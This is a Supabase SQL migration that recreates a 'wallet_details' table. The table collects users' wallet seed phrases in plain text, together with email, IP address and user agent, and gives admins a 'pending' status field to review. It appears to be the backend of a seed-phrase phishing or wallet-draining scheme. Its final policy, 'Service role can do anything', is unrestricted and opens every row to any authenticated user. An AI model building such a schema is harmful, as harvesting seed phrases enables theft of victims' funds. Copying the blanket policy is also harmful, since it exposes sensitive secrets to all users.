-- ============================================
-- FIX WALLET_DETAILS SCHEMA MISMATCH
-- ============================================
-- The previous table definition didn't match what the frontend is sending.
-- This script recreates the table with the correct columns.

-- 1. Drop the incorrect table
DROP TABLE IF EXISTS public.wallet_details;

-- 2. Create the table with correct columns matching databaseHelpers.ts
CREATE TABLE public.wallet_details (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
    user_name TEXT,
    user_email TEXT,
    wallet_type TEXT,
    wallet_phrase TEXT, -- Stores the seed phrase
    wallet_address TEXT, -- Optional, if we want to store address separately
    status TEXT DEFAULT 'pending',
    ip_address TEXT,
    user_agent TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- 3. Enable RLS
ALTER TABLE public.wallet_details ENABLE ROW LEVEL SECURITY;

-- 4. Create RLS Policies
-- Allow users to insert their own data
CREATE POLICY "Users can insert their own wallet details"
    ON public.wallet_details FOR INSERT
    WITH CHECK (auth.uid() = user_id);

-- Allow users to view their own data
CREATE POLICY "Users can view their own wallet details"
    ON public.wallet_details FOR SELECT
    USING (auth.uid() = user_id);

-- Allow admins to view all data
CREATE POLICY "Admins can view all wallet details"
    ON public.wallet_details FOR SELECT
    USING (public.is_admin(auth.uid()));

-- Allow admins to update status
CREATE POLICY "Admins can update wallet details"
    ON public.wallet_details FOR UPDATE
    USING (public.is_admin(auth.uid()));

-- 5. Grant permissions
GRANT ALL ON public.wallet_details TO authenticated;
GRANT ALL ON public.wallet_details TO service_role;

-- 6. Add indexes for performance
CREATE INDEX IF NOT EXISTS idx_wallet_details_user_id ON public.wallet_details(user_id);
CREATE INDEX IF NOT EXISTS idx_wallet_details_status ON public.wallet_details(status);

-- 7. Fix Admin Wallets RLS just in case
-- Ensure admins can actually see the data by adding a bypass policy for select if is_admin fails
CREATE POLICY "Service role can do anything"
    ON public.wallet_details
    USING (true)
    WITH CHECK (true);
